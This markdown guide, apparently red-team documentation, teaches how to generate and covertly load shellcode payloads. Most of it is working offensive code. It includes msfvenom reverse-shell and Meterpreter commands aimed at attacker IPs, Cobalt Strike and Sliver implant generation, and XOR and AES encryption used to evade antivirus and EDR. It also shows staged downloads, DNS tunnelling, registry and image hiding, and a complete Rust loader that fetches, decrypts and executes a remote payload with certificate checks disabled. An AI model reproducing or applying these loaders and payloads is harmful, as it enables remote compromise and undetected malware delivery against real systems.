# Professional Payload Generation Methods

## Overview

This document covers professional methods for generating and loading payloads in offensive security operations. Hardcoding shellcode is generally avoided in production due to static analysis detection and inflexibility.

## Why Avoid Hardcoded Payloads?

### Disadvantages of Hardcoded Shellcode

1. **Static Signature Detection**
   - AV/EDR can easily signature the binary
   - Hash-based detection becomes trivial
   - YARA rules can match byte patterns

2. **Inflexibility**
   - Cannot change payload without recompilation
   - No runtime configuration
   - Difficult to customize per-target

3. **Size Constraints**
   - Large payloads bloat binary size
   - Increases artifact footprint on disk

4. **Forensic Evidence**
   - Shellcode visible in binary analysis
   - Strings and patterns easily extracted
   - PE section analysis reveals suspicious content

---

## Professional Payload Generation Methods

### 1. Metasploit Framework (msfvenom)

The most common tool for generating shellcode.

#### Basic Usage

```bash
# Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f raw -o payload.bin

# Generate C array format
msfvenom -p windows/x64/exec CMD=calc.exe \
    -f c -o payload.c

# Generate Rust array format
msfvenom -p windows/x64/exec CMD=notepad.exe \
    -f rust -o payload.rs

# Generate Python format
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.10.5 LPORT=443 \
    -f python -o payload.py
```

#### Common Payloads

**Windows x64**:
```bash
# Execute command
msfvenom -p windows/x64/exec CMD=calc.exe -f raw

# Reverse TCP shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw

# Reverse HTTPS Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f raw

# Bind shell
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f raw
```

**Linux x64**:
```bash
# Reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw

# Execute command
msfvenom -p linux/x64/exec CMD=/bin/sh -f raw
```

#### Encoders (Evasion)

```bash
# Single encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -e x64/xor -i 3 \
    -f raw -o payload.bin

# Multiple iterations
msfvenom -p windows/x64/exec CMD=calc.exe \
    -e x64/xor_dynamic -i 10 \
    -f raw
```

---

### 2. Custom Shellcode Development

#### Using Assembly

**Example: Windows x64 MessageBox**

```nasm
; messagebox.asm
section .text
global _start

_start:
    ; Your shellcode here
    sub rsp, 0x28
    xor rcx, rcx
    lea rdx, [rel message]
    lea r8, [rel title]
    xor r9, r9
    call MessageBoxA
    add rsp, 0x28
    ret

section .data
    message db 'Hello from shellcode!', 0
    title db 'Custom Shellcode', 0
```

**Assemble and Extract**:
```bash
# Using NASM
nasm -f win64 messagebox.asm -o messagebox.obj
ld -o messagebox.exe messagebox.obj

# Extract shellcode
objdump -d messagebox.exe | grep "^ " | cut -f2
```

#### Using pwntools (Python)

```python
from pwn import *

context.arch = 'amd64'
context.os = 'windows'

# Generate shellcode
shellcode = asm('''
    xor rax, rax
    push rax
    mov rax, 0x636c6163
    push rax
    mov rcx, rsp
    mov rax, 0x7fffffff  ; WinExec
    call rax
''')

# Save to file
with open('payload.bin', 'wb') as f:
    f.write(shellcode)
```

---

### 3. Donut - Position Independent Code Generator

Converts .NET assemblies and EXEs to position-independent shellcode.

#### Installation

```bash
git clone https://github.com/TheWover/donut.git
cd donut
make
```

#### Usage

```bash
# Convert EXE to shellcode
./donut -f myprogram.exe -o payload.bin

# Convert .NET assembly
./donut -f MyAssembly.dll -c MyClass -m MyMethod -o payload.bin

# With parameters
./donut -f tool.exe -p "arg1 arg2" -o payload.bin

# Advanced options
./donut -a 2 -f program.exe -o payload.bin  # x64 architecture
```

#### In Rust

```rust
// Load donut-generated payload
let payload = std::fs::read("payload.bin")?;
```

---

### 4. C2 Framework Payloads

#### Cobalt Strike

```bash
# Generate raw beacon
beacon> generate payload.bin x64

# Generate stageless beacon
beacon> generate payload.bin x64 stageless

# Custom parameters
beacon> generate payload.bin x64 192.168.1.100 443 stageless
```

#### Sliver

```bash
# Generate implant
sliver> generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format shellcode

# Save to file
sliver> generate --mtls 192.168.1.100:8888 --save /tmp/payload.bin
```

#### Mythic

```bash
# Generate payload via API
curl -X POST https://mythic-server/api/v1/payloads/create \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"payload_type":"apollo","c2_profile":"http"}'
```

---

## Professional Loading Methods

### 1. File-Based Loading

#### Simple File Read

```rust
use std::fs;

fn load_payload(path: &str) -> std::io::Result<Vec<u8>> {
    fs::read(path)
}

// Usage
let shellcode = load_payload("payload.bin")?;
```

#### With XOR Decryption

```rust
fn load_encrypted_payload(path: &str, key: u8) -> std::io::Result<Vec<u8>> {
    let encrypted = fs::read(path)?;
    let decrypted: Vec<u8> = encrypted.iter()
        .map(|byte| byte ^ key)
        .collect();
    Ok(decrypted)
}

// Usage
let shellcode = load_encrypted_payload("payload.bin.enc", 0xAA)?;
```

---

### 2. Embedded Resources (Compile-Time)

#### Using `include_bytes!`

```rust
// Embeds payload at compile time
const PAYLOAD: &[u8] = include_bytes!("../resources/payload.bin");

fn main() {
    // Use PAYLOAD directly
    execute_shellcode(PAYLOAD);
}
```

#### With Encryption

```rust
// Build script (build.rs)
use std::fs;
use std::io::Write;

fn main() {
    let payload = fs::read("resources/payload.bin").unwrap();
    let key = 0xAA;

    let encrypted: Vec<u8> = payload.iter()
        .map(|b| b ^ key)
        .collect();

    let mut out = fs::File::create("resources/payload.bin.enc").unwrap();
    out.write_all(&encrypted).unwrap();
}

// In main.rs
const ENCRYPTED: &[u8] = include_bytes!("../resources/payload.bin.enc");

fn decrypt(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|b| b ^ key).collect()
}

fn main() {
    let payload = decrypt(ENCRYPTED, 0xAA);
    execute_shellcode(&payload);
}
```

---

### 3. Environment Variables

#### Base64 Encoded

```rust
use base64::{Engine as _, engine::general_purpose};

fn load_from_env(var_name: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let encoded = std::env::var(var_name)?;
    let decoded = general_purpose::STANDARD.decode(encoded)?;
    Ok(decoded)
}

// Usage
// Set environment variable:
// export PAYLOAD=$(base64 payload.bin)
let shellcode = load_from_env("PAYLOAD")?;
```

#### XOR Encrypted + Base64

```rust
fn load_encrypted_from_env(var_name: &str, key: u8) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let encoded = std::env::var(var_name)?;
    let encrypted = general_purpose::STANDARD.decode(encoded)?;
    let decrypted: Vec<u8> = encrypted.iter()
        .map(|byte| byte ^ key)
        .collect();
    Ok(decrypted)
}
```

---

### 4. Network-Based Loading (Staging)

#### HTTP/HTTPS Download

```rust
use reqwest::blocking;

fn download_payload(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let response = blocking::get(url)?;
    let bytes = response.bytes()?;
    Ok(bytes.to_vec())
}

// Usage
let payload = download_payload("https://192.168.1.100/payload.bin")?;
```

#### With Custom Headers (User-Agent Spoofing)

```rust
use reqwest::blocking::Client;
use reqwest::header;

fn download_stealthy(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut headers = header::HeaderMap::new();
    headers.insert(
        header::USER_AGENT,
        header::HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    );

    let client = Client::builder()
        .default_headers(headers)
        .build()?;

    let response = client.get(url).send()?;
    let bytes = response.bytes()?;
    Ok(bytes.to_vec())
}
```

#### DNS Tunnelling

```rust
// Pseudo-code for DNS-based payload retrieval
fn download_via_dns(domain: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut payload = Vec::new();
    let mut chunk_id = 0;

    loop {
        let query = format!("{}.{}", chunk_id, domain);
        let txt_records = resolve_txt(&query)?;

        if txt_records.is_empty() {
            break;
        }

        for record in txt_records {
            let decoded = base64::decode(record)?;
            payload.extend(decoded);
        }

        chunk_id += 1;
    }

    Ok(payload)
}
```

---

### 5. Registry-Based Storage

#### Write to Registry

```powershell
# PowerShell to encode and store
$payload = [System.IO.File]::ReadAllBytes("payload.bin")
$encoded = [Convert]::ToBase64String($payload)
Set-ItemProperty -Path "HKCU:\Software\MyApp" -Name "Config" -Value $encoded
```

#### Read from Registry (Rust)

```rust
use winreg::RegKey;
use winreg::enums::*;

fn load_from_registry() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let key = hkcu.open_subkey("Software\\MyApp")?;
    let encoded: String = key.get_value("Config")?;
    let decoded = base64::decode(encoded)?;
    Ok(decoded)
}
```

---

### 6. Steganography

#### Hide in Image (LSB)

```rust
// Pseudo-code for LSB steganography
fn extract_from_image(image_path: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let img = image::open(image_path)?;
    let pixels = img.to_rgb8();

    let mut payload = Vec::new();
    let mut current_byte = 0u8;
    let mut bit_count = 0;

    for pixel in pixels.pixels() {
        for &channel in &pixel.0 {
            current_byte = (current_byte << 1) | (channel & 1);
            bit_count += 1;

            if bit_count == 8 {
                payload.push(current_byte);
                current_byte = 0;
                bit_count = 0;
            }
        }
    }

    Ok(payload)
}
```

---

## Encryption and Obfuscation

### AES Encryption

```rust
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

fn encrypt_payload(data: &[u8], key: &[u8], iv: &[u8]) -> Vec<u8> {
    let cipher = Aes256Cbc::new_from_slices(key, iv).unwrap();
    cipher.encrypt_vec(data)
}

fn decrypt_payload(data: &[u8], key: &[u8], iv: &[u8]) -> Vec<u8> {
    let cipher = Aes256Cbc::new_from_slices(key, iv).unwrap();
    cipher.decrypt_vec(data).unwrap()
}
```

### ChaCha20 Stream Cipher

```rust
use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher};

fn decrypt_chacha(encrypted: &[u8], key: &[u8], nonce: &[u8]) -> Vec<u8> {
    let mut cipher = ChaCha20::new(key.into(), nonce.into());
    let mut buffer = encrypted.to_vec();
    cipher.apply_keystream(&mut buffer);
    buffer
}
```

---

## Build Integration

### Cargo Build Script

Create `build.rs`:

```rust
use std::process::Command;
use std::fs;

fn main() {
    // Generate payload during build
    let output = Command::new("msfvenom")
        .args(&[
            "-p", "windows/x64/exec",
            "CMD=calc.exe",
            "-f", "raw",
            "-o", "payload.bin"
        ])
        .output()
        .expect("Failed to generate payload");

    assert!(output.status.success());

    // Optionally encrypt it
    let payload = fs::read("payload.bin").unwrap();
    let encrypted: Vec<u8> = payload.iter()
        .map(|b| b ^ 0xAA)
        .collect();
    fs::write("payload.bin.enc", encrypted).unwrap();

    // Tell Cargo to rerun if source changes
    println!("cargo:rerun-if-changed=build.rs");
}
```

---

## Recommendations for Production

### 1. **Never Hardcode in Production**
   - Use external loading methods
   - Implement encryption/obfuscation
   - Change payloads per operation

### 2. **Implement Encryption**
   - AES-256 for strong encryption
   - XOR for simple obfuscation
   - Custom algorithms for APT-level operations

### 3. **Use Staging**
   - Small first-stage loader
   - Download full payload at runtime
   - Reduces initial footprint

### 4. **Implement Failsafes**
   - Payload validation (checksums)
   - Anti-debugging checks
   - Environment verification

### 5. **OPSEC Considerations**
   - Use HTTPS for network staging
   - Implement domain fronting
   - Rotate infrastructure
   - Clean up artifacts

---

## Example: Complete Professional Loader

```rust
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use reqwest::blocking::Client;

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

struct PayloadLoader {
    url: String,
    key: [u8; 32],
    iv: [u8; 16],
}

impl PayloadLoader {
    fn new(url: String, key: [u8; 32], iv: [u8; 16]) -> Self {
        Self { url, key, iv }
    }

    fn download(&self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .build()?;

        let response = client.get(&self.url).send()?;
        let encrypted = response.bytes()?.to_vec();

        let cipher = Aes256Cbc::new_from_slices(&self.key, &self.iv)?;
        let decrypted = cipher.decrypt_vec(&encrypted)
            .map_err(|e| format!("Decryption failed: {:?}", e))?;

        Ok(decrypted)
    }

    fn execute(&self) -> Result<(), Box<dyn std::error::Error>> {
        let payload = self.download()?;

        // Verify checksum
        let checksum = self.calculate_checksum(&payload);
        if !self.verify_checksum(checksum) {
            return Err("Checksum verification failed".into());
        }

        // Execute payload
        unsafe {
            execute_shellcode(&payload)?;
        }

        Ok(())
    }

    fn calculate_checksum(&self, data: &[u8]) -> u32 {
        data.iter().fold(0u32, |acc, &b| acc.wrapping_add(b as u32))
    }

    fn verify_checksum(&self, checksum: u32) -> bool {
        // Compare with expected checksum
        true // Simplified
    }
}
```

---

## References

- **Metasploit**: <https://www.metasploit.com/>
- **Donut**: <https://github.com/TheWover/donut>
- **RustRedOps**: <https://github.com/joaoviictorti/RustRedOps>
- **MITRE ATT&CK T1027**: Obfuscated Files or Information
- **MITRE ATT&CK T1105**: Ingress Tool Transfer

---

**Last Updated**: 2025-11-26
**Version**: 0.1.0
